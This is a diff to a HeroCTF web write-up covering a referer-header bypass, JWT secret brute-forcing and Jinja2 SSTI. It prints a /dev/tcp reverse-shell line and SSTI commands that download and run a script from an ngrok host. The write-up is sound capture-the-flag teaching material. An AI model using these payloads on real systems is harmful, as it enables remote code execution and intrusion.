@@ -19,6 +19,7 @@ P.S:- The scoreboard was dynamic
 -     IMF#2: A woman's weapon (500 points)
 -     IMF#3: admin:admin (500 points)
 -     IMF#4: Put the past behind (500 points)
+-     Drink from my Flask#2 (500 points)
 
 ## Web
 -     Referrrrer (500 points)
@@ -53,6 +54,160 @@ Running it gives the flag
 
 ```
 Flag: Hero{E4sy_ch4ll3ng3_bu7_tr4pp3d}
+```
+
+# Web
+
+#### Referrrrer
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/076690c3-0ed8-4879-801d-a76742d1eb31)
+
+After downloading the source code and unzipping it I got this
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9e69bdff-2bbb-4272-9d3e-e9d2860afe4d)
+
+Reading the source code shows this
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a9ee6b6c-1641-41dd-b669-ccb5a482b0c6)
+
+So basically there are just two endpoints which are `/` and `/admin` 
+
+Querying `/` just returns the string `Hello World`
+
+But when you query `/admin` it checks for the referer header and compares it with the value `YOU_SHOUD_NOT_PASS!`
+
+If the check is right we get the flag but if it isn't we get `Wrong header!`
+
+Also here's the nginx config 
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d9073c9f-3268-4481-867a-31e88630305b)
+
+Basically we can see that if we query the admin endpoint it checks if the referer header is `https://admin.internal.com` 
+
+If it isn't it returns 403 
+
+Now the problem is for us to get the flag we need to set the referer header to `YOU_SHOUD_NOT_PASS!` but we also need to meet the nginx config check
+
+After I researched about referer header I got to know that both `referer` and `referrer` can be used in expressjs 
+
+Here's the [resource](https://github.com/expressjs/express/blob/master/lib/request.js#L77)
+
+So now we can pass the two checks sweet 😄
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1f62c8e8-f0c6-420f-b441-010d0b64f25f)
+
+```
+Flag: Hero{ba7b97ae00a760b44cc8c761e6d4535b}
+```
+
+#### Drink from my Flask#1
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/689e407d-1a06-45f9-9ebb-2ceaeae7cc94)
+
+After i deployed the instance going over to the web server shows this
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ca55bb12-7651-43ea-ae8d-89381f7533a6)
+
+Looks like we can calculate stuff and yea we can
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c6fd7ef9-a5a9-4f41-a1dc-9a434a44ceb8)
+
+At first I was thinking of python code injection but after hours it failed 😹
+
+So lets see what we've got 
+
+Checking the cookie reveals this jwt token
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/575a62ec-0b6c-425a-a0b4-15381deea8a4)
+
+Decoding it using [jwt.io](https://jwt.io/) gives this
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/dc9a70e0-7928-43b5-bfff-d23b0e145015)
+
+Notice the data value:
+
+```json
+{
+  "role": "guest"
+}
+```
+
+I'll try brute forcing the jwt token key and I got the SECRET key to be `key`
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/3f3e1409-5703-4208-8c34-49c64cee0440)
+
+Now we can sign a new token as user admin 
+
+But before that trying to access an invalid page returns this
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/7efea393-01d1-43ee-9972-7cb947aec1ef)
+
+It shows that the valid paths are `/` and `/adminPage`
+
+Notice also how the url path is reflected back to us 
+
+Trying basic SSTI payload works
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/91d7cff1-a703-429d-bc86-6132b3068375)
+
+But let's see the adminPage endpoint
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/bd16c9ef-c6e6-4999-8641-fff30703c95b)
+
+We notice that it reflects back the role value for the jwt token 
+
+So what i tried was using a ssti payload as the username signing the token using the SECRET key as `key` then replacing it with my token
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9e0156df-5063-4213-bcaa-d06acedd2210)
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/703b1511-f86c-4c5e-a68b-93bdb6259ae1)
+
+It works so there's ssti both on the url path and the role value in the jwt token
+
+But trying a payload gotten from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---remote-code-execution) doesn't work when i used it in the url
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/dcbdb5b7-ce4c-4c94-9b8e-6cdff1b09912)
+
+But when used in the jwt token It works
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/bd379737-ea68-420c-883c-5338192b444a)
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e03df946-d9fa-44a9-89ad-6ae9b1986146)
+
+If you notice doing that manually is quite stressfull so with the help of google I searched on how to sign a key with python and i made this [script](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/heroctf/Web/Flask1/ssti.py)
+
+Using it I can execute command
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5bba895d-b763-4786-a6ca-079f52dee100)
+
+Time for a reverse shell
+
+I had to edit my ngrok config file to tunnel 3 connections
+
+```yml
+version: "2"
+authtoken: [REDACTED]
+
+tunnels:
+  app-0x:
+    addr: 80
+    proto: tcp
+  app-dead:
+    addr: 443
+    proto: tcp
+  app-beef:
+    addr: 1337
+    proto: http
+```
+
+Now I made it start all 3 tunnels
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/4febc6d1-1deb-4669-9b61-87beec8d7865)
+
+Back on getting shell here's my payloads
+
+I stored this in a file called `lol.sh`
+
+```sh
+sh -i >& /dev/tcp/0.tcp.eu.ngrok.io/19990 0>&1
+```
+
+Then i started a python web server on that same directory and used this, btw I also hosted a nc listener on port 443
+
+```
+python3 ssti.py http://dyn-02.heroctf.fr:14278 "{{ cycler.__init__.__globals__.os.popen('curl http://6.tcp.eu.ngrok.io:10227/lol.sh -o /tmp/lol.sh').read() }}"
+python3 ssti.py http://dyn-02.heroctf.fr:14278 "{{ cycler.__init__.__globals__.os.popen('chmod +x /tmp/lol.sh').read() }}"
+python3 ssti.py http://dyn-02.heroctf.fr:14278 "{{ cycler.__init__.__globals__.os.popen('bash /tmp/lol.sh').read() }}"
+```
+
+From there I got shell
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d289dc00-eed8-441c-b66f-79426e613945)
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5ee9663c-047d-43da-8691-0d23464476ff)
+
+And we have the flag 
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a5e6497c-4dbe-4226-a793-0c8e5bba018e)
+
+```
+Flag: Hero{sst1_fl4v0ur3d_c0Ok1e}
 ```
 
 # System
@@ -503,21 +658,3 @@ Running that decrypts the file and I got the flag
 Flag: Hero{4_l1ttle_h1st0ry_l3ss0n_4_u}
 ```
 
-# Web
-
-#### Referrrrer
-![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/076690c3-0ed8-4879-801d-a76742d1eb31)
-
-After downloading the source code and unzipping it I got this
-![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9e69bdff-2bbb-4272-9d3e-e9d2860afe4d)
-
-Reading the source code shows this
-![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a9ee6b6c-1641-41dd-b669-ccb5a482b0c6)
-
-So basically there are just two endpoints which are `/` and `/admin` 
-
-Querying `/` just returns the string `Hello World`
-
-But when you query `/admin` it checks for the referer header and compares it with the value `YOU_SHOUD_NOT_PASS!`
-
-If the check is right we get the flag but if it isn't we get `Wrong header!`
